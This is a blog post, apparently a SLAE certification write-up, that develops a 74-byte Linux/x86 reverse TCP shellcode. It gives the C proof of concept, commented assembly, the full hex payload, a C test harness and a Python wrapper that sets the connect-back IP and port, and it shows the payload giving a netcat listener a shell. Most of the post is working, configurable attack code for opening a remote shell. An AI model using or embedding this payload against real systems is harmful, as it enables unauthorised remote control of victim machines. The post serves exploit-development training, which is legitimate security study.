---
title: 'SLAE: Shell Reverse TCP Shellcode (Linux/x86)'
categories:
- Certifications
---
Now Mario meets Luigi....or what's a bind without a reverse shellcode?

I've spend some extra time again to reduce the shellcode size and make it fully register aware, so that this shellcode could handle every exploit-scenario. It's therefore currently at a size of **74 bytes**, which should make it one of the smallest Linux-based Shell Reverse TCP shellcode over at [shell-storm](http://shell-storm.org/shellcode/)!

There also two ([#1](http://shell-storm.org/shellcode/files/shellcode-838.php), [#2](http://shell-storm.org/shellcode/files/shellcode-833.php)) shellcodes made by Geyslan G. Bem, which are even smaller in size - good job! He added a small register-polluting piece of code to make sure that the shellcode runs in any circumstances:

{% highlight assembly %}__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp");

Now onto my small piece of cake, which doesn't need this :-)

### Assignment #2: Shell Reverse TCP Shellcode

The second assignment in the SecurityTube Linux Assembly Expert exam is about creating a shellcode, which:

*   Reverse connects to a configured IP and port
*   Executes a shell on successful connection
*   is easily configureably (in regards to the IP and port)

### Shell Reverse TCP PoC

In comparison to assignment #1, I've slightly modified the proof of concept code, which is now able to connect back to an IP address (in this case 127.0.0.1) on port 1337:

<pre class="lang:c decode:true">// SLAE - Assignment #2: Shell Reverse TCP (Linux/x86) PoC
// Author:  Julien Ahrens (@MrTuxracer)
// Website:  https://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
	int i; // used for dup2 later
	int sockfd; // socket file descriptor
	socklen_t socklen; // socket-length for new connections

	struct sockaddr_in srv_addr; // client address

	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order

	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

	// connect socket
	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(sockfd, i);

	// magic
	execve( "/bin/sh", NULL, NULL );
}
{% endhighlight %}

### Assembly prepation

As shown in the C source code, you need to translate the following calls into Assembly language:

1.  Create a socket
2.  Connect to a specified IP and port
3.  Redirect stdin, stdout and stderr via dup2
4.  Execute some more magic

Looks like this will save some more bytes in comparison to assignment #1 :-)

### Create a socket

This is pretty much the same like in assignment #1, except a slightly different register layout, which I have chosen. I'm using EDX for the protocol argument instead of ESI - this is just for keeping the overall count of used registers as small as possible, so you have less things to cleanup ;-):

{% highlight assembly %}
;
; int socketcall(int call, unsigned long *args);
; sockfd = socket(int socket_family, int socket_type, int protocol);
;
push 0x66 
pop eax ;syscall: sys_socketcall + cleanup eax

push 0x1
pop ebx ;sys_socket (0x1) + cleanup ebx

xor edx,edx ;cleanup edx

push edx ;protocol=IPPROTO_IP (0x0)	
push ebx ;socket_type=SOCK_STREAM (0x1)
push 0x2 ;socket_family=AF_INET (0x2)

mov ecx, esp ;save pointer to socket() args

int 0x80 ;exec sys_socket

xchg edx, eax; save result (sockfd) for later usage
{% endhighlight %}

In the end, the socket file descriptor is again saved into EDX using a one-byte XCHG. If you're interested in a deep-analysis of this part, have a look at my [previous](https://www.rcesecurity.com/2014/07/slae-shell-bind-tcp-shellcode-linux-x86/ "SLAE: Shell Bind TCP Shellcode (Linux/x86)") article.

### Connect to a specified IP and port

OK, that's the new and interesting part. First you need the standard socketcall-syscall in AL again:

{% highlight assembly %};
; int socketcall(int call, unsigned long *args);
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
mov al, 0x66
{% endhighlight %}

I'll skip the connect() syscall-setup (EBX) for a moment, because my register-layout is a bit optimized for this part. Don't worry - I'll come back to this part soon!

First let's have a look at the connect() arguments, these are the same as for the bind() call. Again the most interesting argument is the sockaddr struct:

{% highlight cpp %}
;struct sockaddr_in {
;  __kernel_sa_family_t  sin_family;     /* Address family               */
;  __be16                sin_port;       /* Port number                  */
;  struct in_addr        sin_addr;       /* Internet address             */
;};
{% endhighlight %}

As you'd like to connect back to an ip address / port combination, you need to place these arguments at this point. First of all (remember: reverse order!): sin_addr. The ip address is in network byte order, and is therefore reversed PUSHed onto the stack. Each octet is represented by one byte without the dots:

{% highlight assembly %}
push 0x0101017f  ;sin_addr=127.1.1.1 (network byte order)
{% endhighlight %}

Same for the port:

{% highlight assembly %}
push word 0x3905 ;sin_port=1337 (network byte order)
{% endhighlight %}

**Small side-note**: The whole shellcode is 0x00-free as long as the ip address and port are! Therefore this shellcode connects back to the localhost via 127.1.1.1!

EBX contains 0x1 at this point due to the socket_type PUSH during the socket() call, so incrementing EBX does the next job (the sin_family argument), which needs to be 0x2, smoothly:

{% highlight assembly %}
inc ebx          
push word bx     ;sin_family=AF_INET (0x2)
{% endhighlight %}

Now, save the pointer to this sockaddr struct to ECX:

{% highlight assembly %}
mov ecx, esp ;save pointer to sockaddr_in struct
{% endhighlight %}

Last but not least: You need the connect function call in EBX, which is 0x3 according to /usr/include/linux/net.h:

{% highlight cpp %}
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
{% endhighlight %}

Thankfully EBX already contains 0x2 due to the sin_family PUSH...just one INC to rule'em all ;-) :

{% highlight assembly %}
inc ebx ; sys_connect (0x3)
int 0x80 ;exec sys_connect
{% endhighlight %}

### Redirect stdin, stdout and stderr via dup2

Now, this part should look very familiar to you. But the register layout is a bit different:

[![linux_x86_shell_reverse_tcp-1]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-1.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-1.png)

You need to redirect stdin(0), stdout(1) and stderr(2) to have some output in your reverse shell. In assignment #1 you had a perfectly fitting stack, which held all needed values. As I am using a decrementing counter again, ECX has to be set to 0x2, but it's not on the stack somewhere. So the simple solution (3 bytes) looks like the following:

{% highlight assembly %};
; int socketcall(int call, unsigned long *args);
; int dup2(int oldfd, int newfd);
;
push 0x2
pop ecx  ;set loop-counter
{% endhighlight %}

ECX is now ready for the loop, just saving the socket file descriptor to EBX as you need it there during the dup2-syscall:

{% highlight assembly %}
xchg ebx,edx ;save sockfd
{% endhighlight %}

Followed by the same looping-fun like in assignment #1:

{% highlight assembly %}
; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
	mov al, 0x3f ;syscall: sys_dup2 
	int 0x80     ;exec sys_dup2
	dec ecx	     ;decrement loop-counter
	jns loop     ;as long as SF is not set -> jmp to loop
{% endhighlight %}

Finally all 3 outputs are redirected!

### Execute some more magic

This is nearly the same like last time, but again with a small change: You need to PUSH the terminating NULL for the /bin//sh string seperately onto the stack, because there isn't already one to use:

{% highlight cpp %}
;
; int execve(const char *filename, char *const argv[],char *const envp[]);
;
mov al, 0x0b ; syscall: sys_execve

inc ecx      ;argv=0
mov edx,ecx  ;envp=0

push edx        ;terminating NULL
push 0x68732f2f	;"hs//"
push 0x6e69622f	;"nib/"

mov ebx, esp ;save pointer to filename

int 0x80 ; exec sys_execve
{% endhighlight %}

DONE.

### Complete shellcode

Here's the complete and commented shellcode:

{% highlight assembly %}
; SLAE - Assignment #2: Shell Reverse TCP Shellcode (Linux/x86)
; Author:  Julien Ahrens (@MrTuxracer)
; Website:  https://www.rcesecurity.com

global _start			

section .text
_start:
	;
	; int socketcall(int call, unsigned long *args);
	; sockfd = socket(int socket_family, int socket_type, int protocol);
	;
	push 0x66 
	pop eax ;syscall: sys_socketcall + cleanup eax

	push 0x1
	pop ebx ;sys_socket (0x1) + cleanup ebx

	xor edx,edx ;cleanup edx

	push edx ;protocol=IPPROTO_IP (0x0)	
	push ebx ;socket_type=SOCK_STREAM (0x1)
	push 0x2 ;socket_family=AF_INET (0x2)

	mov ecx, esp ;save pointer to socket() args

	int 0x80 ;exec sys_socket

	xchg edx, eax; save result (sockfd) for later usage

	;
	; int socketcall(int call, unsigned long *args);
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	mov al, 0x66

	;struct sockaddr_in {
	;  __kernel_sa_family_t  sin_family;     /* Address family               */
	;  __be16                sin_port;       /* Port number                  */
	;  struct in_addr        sin_addr;       /* Internet address             */
	;};

	push 0x0101017f  ;sin_addr=127.1.1.1 (network byte order)
	push word 0x3905 ;sin_port=1337 (network byte order)
	inc ebx          
	push word bx     ;sin_family=AF_INET (0x2)
	mov ecx, esp     ;save pointer to sockaddr struct

	push 0x10 ;addrlen=16
	push ecx  ;pointer to sockaddr
	push edx  ;sockfd

	mov ecx, esp ;save pointer to sockaddr_in struct

	inc ebx ; sys_connect (0x3)

	int 0x80 ;exec sys_connect 

	;
	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);
	;
	push 0x2
	pop ecx  ;set loop-counter

	xchg ebx,edx ;save sockfd

; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
	mov al, 0x3f ;syscall: sys_dup2 
	int 0x80     ;exec sys_dup2
	dec ecx	     ;decrement loop-counter
	jns loop     ;as long as SF is not set -> jmp to loop

	;
	; int execve(const char *filename, char *const argv[],char *const envp[]);
	;
	mov al, 0x0b ; syscall: sys_execve

	inc ecx      ;argv=0
	mov edx,ecx  ;envp=0

	push edx        ;terminating NULL
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"

	mov ebx, esp ;save pointer to filename

	int 0x80 ; exec sys_execve
{% endhighlight %}

### Test the shellcode

Same commandline-fu:

{% highlight bash %}
objdump -d ./linux_x86_shell_reverse_tcp.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}

Same template, different opcodes:

{% highlight cpp %}
#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
{% endhighlight %}

Same compilation-fu:

{% highlight bash %}
gcc shellcode.c -o linux_x86_shell_reverse_tcp -fno-stack-protector -z execstack -m32
{% endhighlight %}

But amazing different magic! Start a netcat-listener on port 1337:

[![linux_x86_shell_reverse_tcp-2]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-2.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-2.png)

Fire up the shellcode:

[![linux_x86_shell_reverse_tcp-3]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-3.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-3.png)

And finally type in some crazy tux-fu in your reverse-shell:

[![linux_x86_shell_reverse_tcp-4]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-4.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-4.png)

You may also verify the different syscalls using strace: [![linux_x86_shell_reverse_tcp-5]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-51.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-51.png)

### IP-Address and Port Configuration

I love Python for many reasons! Just to mention one: things are done quickly!

{% highlight python %}
#!/usr/bin/python

# SLAE - Assignment #2: Shell Reverse TCP Shellcode (Linux/x86) Wrapper
# Author:  Julien Ahrens (@MrTuxracer)
# Website:  https://www.rcesecurity.com 

import sys

def rethex(n):
	h1 = hex(int(n))[2:]

	if len(h1) == 3:
		h1 = "0" + h1

	if len(h1) >= 3:
		t1 = h1[0:2]
		t2 = h1[2:4]
		h1 = "\x" + t1 + "\x" + t2

	if len(h1) < 4 and len(h1) > 2:
		h1 = "0" + h1
	if len(h1) < 2:
		h1="\x0" + h1
	if len(h1) == 2:
		h1="\x" + h1
	if h1 == "\x00":
		print "Oops, looks like the final shellcode contains a \x00 :(!\r\n"
		exit()
	return h1	

total = len(sys.argv)
if total != 3:
	print "Usage: python linux_x86_shell_reverse_tcp.py [ip] [port]"
else:
	try:
		ip = sys.argv[1]
		addr = ""
		for i in range(0,4):
			addr = addr + rethex(ip.split(".",3)[i])			
		print "Shellcode-ready address: " + addr 

		port = sys.argv[2]
		if int(port) > 65535:
			print "Port is greater than 65535!"
			exit()
		if port < 1024:
			print "Port is smaller than 1024! Remember u need r00t for this ;)"
			exit()	

		shellport = rethex(port)

		print "Shellcode-ready port: " + shellport + "\r\n\r\nShellcode:\r" 

		shellcode = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2"+
		"\x52\x53\x6a\x02\x89\xe1\xcd\x80"+
		"\x92\xb0\x66\x68"+addr+
		"\x66\x68"+shellport+"\x43\x66\x53\x89"+
		"\xe1\x6a\x10\x51\x52\x89\xe1\x43"+
		"\xcd\x80\x6a\x02\x59\x87\xda\xb0"+
		"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"+
		"\x41\x89\xca\x52\x68\x2f\x2f\x73"+
		"\x68\x68\x2f\x62\x69\x6e\x89\xe3"+
		"\xcd\x80")

		print "Final shellcode:\r\b\"" + shellcode + "\""

	except:
		print "exiting..."
{% endhighlight %}

Let's test this script in a real-world environment! Using the ip as the first, and the port as the second argument, echoes back the new shellcode, which is ready to use:

[![linux_x86_shell_reverse_tcp-6]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-6.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-6.png)

Let's test the new shellcode by starting a netcat listener on Kali with the assigned IP address 10.1.1.1 and running the shellcode on a second box, which results in shellcode-fu:

[![linux_x86_shell_reverse_tcp-7]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-7.png)]({{ site.baseurl }}/assets/linux_x86_shell_reverse_tcp-7.png)

et voila, mission accomplished :-)

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
(http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</span>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE- 497
